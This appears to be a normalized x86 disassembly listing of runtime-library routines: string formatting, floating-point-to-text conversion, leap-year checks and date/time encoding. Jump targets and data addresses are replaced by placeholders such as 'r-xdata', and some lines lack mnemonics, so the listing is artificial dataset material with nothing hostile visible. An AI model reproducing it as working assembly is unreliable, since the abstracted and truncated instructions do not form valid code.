lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4086b4
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4084a8
mov esi eax
inc esi
mov eax esi
call sub_408694
mov ecx esi
mov edx ebx
call sub_4084d4
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4086f0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40be44
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4084d4
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407b10
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408778
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408acf
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40885a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_4088a2
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40885a
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40876c
pop edx
or edx edx
je r-xdata
sub_40885a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408acf
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4088a2
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408acf
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_4086f0
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_4088c9 ]
mov ebx ecx
sub cl 0x44
je sub_407ec0
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4040c4
jmp r-xdata
mov esi sub_404124
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407ec0
sub cl 0x44
je sub_407e54
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407e54
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407ec0
mov ecx 0x10
cmp bl 0x58
je sub_407e54
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408748
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408c88
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407e54
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408af0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4084a8
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408778
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408b30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4084a8
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408778
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408b84
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40415c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40415c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40415c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408778
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403f8c
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403e9c
mov eax esi
mov edx ebx
call sub_4044e8
mov eax [ ebp - 0x4 ]
call sub_40415c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408778
mov edx esi
xchg edx eax
call sub_4044e8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408c44
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408c88
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408f5c
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408d87
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408d91
call sub_408d87
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408c44
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408ded
call sub_408d87
call sub_408d7e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408d7e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408c44
retn
xor ecx ecx
sub_408e29
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408d7e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408d7e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408e8e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408ee2
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408e29
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408f5c
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408f89
jmp r-xdata
call sub_4090ab
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408f89
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402cb8
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4090ab
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409188
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40923f
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40924a
neg edx
mov ecx esi
call sub_40924a
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40923f
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409266
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402cb8
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40924a
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409266
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40929c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408c88
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403f8c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4092cc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408c88
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403f8c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409318
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40435c
mov edx esp
xor ecx ecx
call sub_409188
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409344
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40435c
mov edx esp
xor ecx ecx
call sub_409188
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40938c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4093d0
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409440
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40938c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407af4
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407af4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407af4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40949c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4094d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_40949c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4095a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40938c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407af4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407af4
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407af4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40949c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_4096ec
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4095a0
pop esi
pop ecx
pop ebp
retn 0x8
sub_40970c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40938c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409748
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_402930
sub_40978c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40415c
mov edx eax
mov eax ebx
call sub_409748
pop ecx
pop ebx
pop ebp
retn
sub_4097ac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
